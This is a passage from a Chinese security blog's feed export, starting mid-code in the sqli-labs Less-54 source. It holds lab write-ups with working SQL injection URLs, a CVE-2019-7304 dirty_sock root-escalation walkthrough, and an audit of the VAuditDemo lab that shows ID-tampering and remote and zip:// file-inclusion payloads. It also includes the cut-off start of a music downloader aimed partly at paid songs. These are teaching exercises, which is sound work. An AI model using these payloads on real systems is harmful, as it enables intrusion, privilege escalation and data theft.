&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-54.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div  style=<span class="string">" color:#00FFFF; font-size:18px; text-align:center"</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">"input"</span> action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Submit Secret Key: &lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name = <span class="string">"answer_key"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]); <span class="comment">/*处理特殊字符*/</span></span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line"><span class="comment">//echo $key;</span></span><br><span class="line"><span class="comment">//Query table to verify your result</span></span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line"><span class="comment">//echo "$sql";</span></span><br><span class="line">$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line"> </span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>; </span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>要求你注入获取到key，数据库不在是security,限制注入次数为10次，如果超过此次数，重定向到主页，并且每次的密码都是随机的。虽然如此，但是这是通过cookie来判断你的次数，你可以修改你cookie或者更换IP和浏览器来进行多次试验<br>PS:给出数据库名：challenges<br><img src="https://s2.ax1x.com/2019/02/14/kDP6ij.png" alt="kDP6ij.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%22v1icuozblo%22%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(secret_J0N4,tryy),3%20from%20v1icuozblo%20--+</span><br></pre></td></tr></table></figure><p>最终得到随机密码是：J7oVFGp7S8WSd5Nb1xLBK7uF11</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2019-7304 Ubuntu Equity</title>
      <link href="/posts/92d560e0.html"/>
      <url>/posts/92d560e0.html</url>
      <content type="html"><![CDATA[<h2 id="CVE-2019-7304复现"><a href="#CVE-2019-7304复现" class="headerlink" title="CVE-2019-7304复现"></a>CVE-2019-7304复现</h2><hr><ul><li>前言</li><li>正文</li></ul><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>今天tm的情人节，我还在复现漏洞真是太爽了<br><img src="http://p3.pstatp.com/large/pgc-image/15319211658406048fb51ad" alt="15319211658406048fb51ad"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><hr><p>本次提权漏洞有以下Ubuntu版本受到影响：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 18.10</span><br><span class="line"></span><br><span class="line">Ubuntu 18.04 LTS</span><br><span class="line"></span><br><span class="line">Ubuntu 16.04 LTS</span><br><span class="line"></span><br><span class="line">Ubuntu 14.04 LTS</span><br></pre></td></tr></table></figure></p><p>提权漏洞的起因是：<br>由于 snapd API 中的错误，Ubuntu Linux 部分版本被发现有本地权限提升漏洞</p><p><b>复现</b><br>我的环境是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu version:16.04 LTS</span><br><span class="line">snapd API version:2.34.2</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/14/kB12w9.png" alt="kB12w9.png"></p><p>下载POC：<a href="https://github.com/initstring/dirty_sock" target="_blank" rel="noopener">GitHub - initstring/dirty_sock: Ubuntu Linux privilege escalation exploit (CVE-2019-7304)</a><br><img src="https://s2.ax1x.com/2019/02/14/kB1oQO.md.png" alt="kB1oQO.md.png"></p><p>第一个POC<br>先登录Ubuntu，<a href="https://login.ubuntu.com/" target="_blank" rel="noopener">https://login.ubuntu.com/</a><br>在本地生成秘钥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;&lt;you email&gt;&quot;</span><br></pre></td></tr></table></figure></p><p>然后到./.ssh下把，id_rsa.pub（公钥）拷到你账户的ssh_key里面去<br><img src="https://s2.ax1x.com/2019/02/14/kB14W6.png" alt="kB14W6.png"></p><p>本地执行第一个poc<br><img src="https://s2.ax1x.com/2019/02/14/kB17Oe.md.png" alt="kB17Oe.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/14/kB1qwd.png" alt="kB1qwd.png"></p><p>如果出现,以下问题就是你没有安装ssh服务<br><img src="https://s2.ax1x.com/2019/02/14/kB1vfP.md.png" alt="kB1vfP.md.png"></p><p>执行：apt-get install openssh-server 即可解决问题，然后再执行一次POC就ok</p><p>执行完POC后，sudo -i即可获取root权限<br><img src="https://s2.ax1x.com/2019/02/14/kB3790.png" alt="kB3790.png"></p><p>第二个POC直接执行即可<br><img src="https://s2.ax1x.com/2019/02/14/kB3qjU.png" alt="kB3qjU.png"></p><p>然后他会创建dirty_sock用户，密码也是dirty_sock，su dirty_sock输入密码，然后在sudo -i ,输入dirty_sock的密码，切换到root用户即可</p><p><img src="https://s2.ax1x.com/2019/02/14/kB8S41.png" alt="kB8S41.png"></p><p><img src="https://s2.ax1x.com/2019/02/14/kB899x.png" alt="kB899x.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Shooting field audit summary</title>
      <link href="/posts/9cb056fa.html"/>
      <url>/posts/9cb056fa.html</url>
      <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><hr><ul><li>说明</li><li>前言</li><li>审计过程</li><li>小结</li></ul><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>下午审计了一波，成功用burp把环境搞崩= =哈哈哈<br><img src="http://p1.pstatp.com/large/pgc-image/152299419224284d5b16a1d" alt="152299419224284d5b16a1d"></p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><hr><p>V靶场全名(VAuditDemo_Debug),我这里简称V</p><h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><hr><p>这是我之前审计过的地方（我扔博客里了，这里就不在重复）：</p><p><b>越权的发现</b><br>代码路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\VAuditDemo-master\VAuditDemo_Debug\user\UpdateName.php</span><br></pre></td></tr></table></figure></p><p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../sys/config.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) ) &#123; <span class="comment">/*判断是否存在POST请求的submit和username参数*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($_POST[<span class="string">'username'</span>])&gt;<span class="number">16</span>) &#123; <span class="comment">/*判断用户名是否长过16位*/</span></span><br><span class="line">$_SESSION[<span class="string">'error_info'</span>] = <span class="string">'用户名過長（用戶名長度&lt;=16）'</span>;</span><br><span class="line">header(<span class="string">'Location: edit.php'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clean_username = clean_input($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$clean_user_id = clean_input($_POST[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断用户名已是否存在</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE user_name = '$clean_username'"</span>; <span class="comment">/*b不存在SQL注入*/</span></span><br><span class="line">    $data = mysql_query($query, $conn);</span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($data) == <span class="number">1</span>) &#123;</span><br><span class="line">$_SESSION[<span class="string">'error_info'</span>] = <span class="string">'用户名已存在'</span>;</span><br><span class="line">header(<span class="string">'Location: edit.php'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"UPDATE users SET user_name = '$clean_username' WHERE user_id = '$clean_user_id'"</span>; <span class="comment">/*b不存在SQL注入*/</span></span><br><span class="line">mysql_query($query, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"update error!"</span>);</span><br><span class="line">mysql_close($conn);</span><br><span class="line"><span class="comment">//刷新缓存</span></span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $clean_username;</span><br><span class="line">header(<span class="string">'Location: edit.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">not_find($_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.先判断是否有POST请求</span></span><br><span class="line"><span class="comment">2.判断新的用户名是否长过16位</span></span><br><span class="line"><span class="comment">3.判断用户名是否存在</span></span><br><span class="line"><span class="comment">4.更新数据库名</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PS：少了检测请求的ID是否等于用户的id，也就是说通过修改这个ID就能达到修改别的用户的名称实现平行越权</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>实验：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一个用户：admins 密码：admin</span><br><span class="line">第二个用户：我喜欢你 密码：111111</span><br></pre></td></tr></table></figure></p><p>使用我喜欢你这个用户来改admins用户的用户名：<br><img src="https://s2.ax1x.com/2019/02/12/kdXEex.png" alt="kdXEex.png"></p><p>修改前的数据库：<br><img src="https://s2.ax1x.com/2019/02/12/kdXNtS.png" alt="kdXNtS.png"></p><p>Burp抓包重放：<br><img src="https://s2.ax1x.com/2019/02/12/kdXdpQ.png" alt="kdXdpQ.png"></p><p>修改后的数据库：<br><img src="https://s2.ax1x.com/2019/02/12/kdXwlj.png" alt="kdXwlj.png"></p><p><b>文件包含漏洞</b><br>在审计别的洞的时间用burp扫了一波，发现index.php居然有文件包含= =<br>burp扫描配置如下：<br><img src="https://s2.ax1x.com/2019/02/12/kwVgN4.md.png" alt="kwVgN4.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/12/kwV24J.png" alt="kwV24J.png"></p><p>文件包含：<br><img src="https://s2.ax1x.com/2019/02/12/kwVIu6.png" alt="kwVIu6.png"></p><p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'sys/config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="row"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Include */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'module'</span>]))&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'module'</span>].<span class="string">'.inc'</span>);<span class="comment">/*指定后缀*/</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="jumbotron" style="text-align: center;"&gt;</span><br><span class="line">&lt;h1&gt;&lt;b&gt;VAuditDemo&lt;/b&gt;&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;一个简单的Web漏洞演练平台&lt;/p&gt;&lt;br /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class="col-lg-12"&gt;</span><br><span class="line">&lt;h2&gt;用於演示講解PHP基本漏洞&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'footer.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>绕过方法有两种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.远程文件包含 要求：allow_url_fopen开启</span><br><span class="line">2.zip协议  要求：zip协议没被禁止,知道绝对路径</span><br></pre></td></tr></table></figure></p><p>远程包含payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?module=http://127.0.0.1/1.txt?</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/12/kwVvvt.png" alt="kwVvvt.png"></p><p>ZIP协议如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?module=zip://I:\phpstudy\PHPTutorial\WWW\VAuditDemo-master\VAuditDemo_Debug\demo.zip%23</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/12/kwZVvq.png" alt="kwZVvq.png"></p><p>压缩包图片：<br><img src="https://s2.ax1x.com/2019/02/12/kwZmrV.png" alt="kwZmrV.png"></p><p>这里有个坑：就是你用zip协议的时候压缩包里面文件名一定要一样不然不行的，如果他指定后缀名<br>你就两个后缀名 比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">指定后缀为：dd.txt 那么你压缩包里面就要放个dd.txt</span><br><span class="line">指定后缀名为：.inc和上面一样那么压缩包放个.inc.inc</span><br></pre></td></tr></table></figure></p><p>靶场下载地址：<a href="http://t.cn/Ec19F3B" target="_blank" rel="noopener">http://t.cn/Ec19F3B</a></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">快速判断是否有SQL注入，在带入数据库查询之前看看参数是否有使用什么函数之类的，有就直接过，除非数据库编码是GBK，如果是黑名单替换，看看是否能绕过</span><br><span class="line"></span><br><span class="line">在框架的php文件里面快速搜索<span class="keyword">include</span>这个关键词，看看哪里有参数可控的地方，如果有测试一下说不定能找到个文件包含</span><br></pre></td></tr></table></figure><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Netease cloud music download</title>
      <link href="/posts/733bcb3d.html"/>
      <url>/posts/733bcb3d.html</url>
      <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><hr><ul><li>前言</li><li>思路</li><li>代码</li></ul><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>想写个能下载网易云歌曲的那种东西来逗逗女孩子开心，当然付费的那种也行。就是抓了某个网易云某接口吧，不知道是不是。朋友先写点后来瞎翻东西的时候看到的，后面也自己也写了一个单是反现之前那个太烂了。果断重写<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181011/7d14bd14a8074bfb8fed5e78d6603510.jpeg" alt="7d14bd14a8074bfb8fed5e78d6603510.jpeg"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><hr><p>由于那个接口下载歌曲要获取歌曲的ID才能下载，类似于以下这样：<br>（拿全职猎人的departure这首歌的URL来说，url后面的id就是歌曲下载的id）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">全职猎人departure!：https://music.163.com/#/song?id=496618</span><br><span class="line">访问下载接口：http://music.163.com/song/media/outer/url?id=496618.mp3</span><br><span class="line">得到最终下载地址：http://m10.music.126.net/20190212143936/506150fe805d1a57e81122e0f2e2bf00/ymusic/973f/38a2/f492/d3ff0469103cdb1ecba8c4864ec2659c.mp3</span><br></pre></td></tr></table></figure></p><p>得到思路：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.先写个搜索歌曲的功能，通过抓包可以看到json返回的结果里有歌曲名称和歌曲id</span><br><span class="line">2.然后在进行访问接口</span><br><span class="line">3.最终得到 完整的下载地址然后进行下载</span><br><span class="line">4.由于这个下载地址一打开就会自动放歌，添加一个试听的功能</span><br></pre></td></tr></table></figure></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><hr><p>PS：解密脚本，由于网易云搜索是有加密的，这里我看了半天看不懂直接CV别人的来用了<br>分析网易云音乐加密文章来源：<br><a href="https://zhuanlan.zhihu.com/p/34114167" target="_blank" rel="noopener">网易云音乐Ajax Post参数加密方法 - 知乎</a><br><a href="http://link.zhihu.com/?target=https%3A//github.com/leo0309/wangyiyunMusicAjaxAnalysis" target="_blank" rel="noopener">netEaseMuiscEncrypot.py来源</a></p><p>netEaseMuiscEncrypot.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#PKCS_7方式进行补位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(data:bytes,blockbytes:int=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    data:需要补位的bytes</span></span><br><span class="line"><span class="string">    blockbytes:块bytes大小</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    _data = data</span><br><span class="line">    <span class="comment">#判断是否是字符串，如果是则按utf8编码为bytes</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(_data,str):</span><br><span class="line">        _data = _data.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    length = len(_data)</span><br><span class="line">    pad_length = blockbytes - length % blockbytes</span><br><span class="line">    padding = (chr(pad_length)*pad_length).encode(<span class="string">'utf8'</span>)</span><br><span class="line">    _data += padding</span><br><span class="line">    <span class="keyword">return</span> _data</span><br><span class="line"></span><br><span class="line"><span class="comment">#dict序列化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dictSerialize</span><span class="params">(data:dict)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(data,dict):</span><br><span class="line">        _data = dict(data)</span><br><span class="line">    _data = data</span><br><span class="line">    _data = json.dumps(_data,ensure_ascii=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">return</span> _data</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成随机值用于AES第二阶段加密的密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand_a</span><span class="params">(a=<span class="number">16</span>)</span>:</span></span><br><span class="line">    b = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span></span><br><span class="line">    c = <span class="string">""</span></span><br><span class="line">    length = 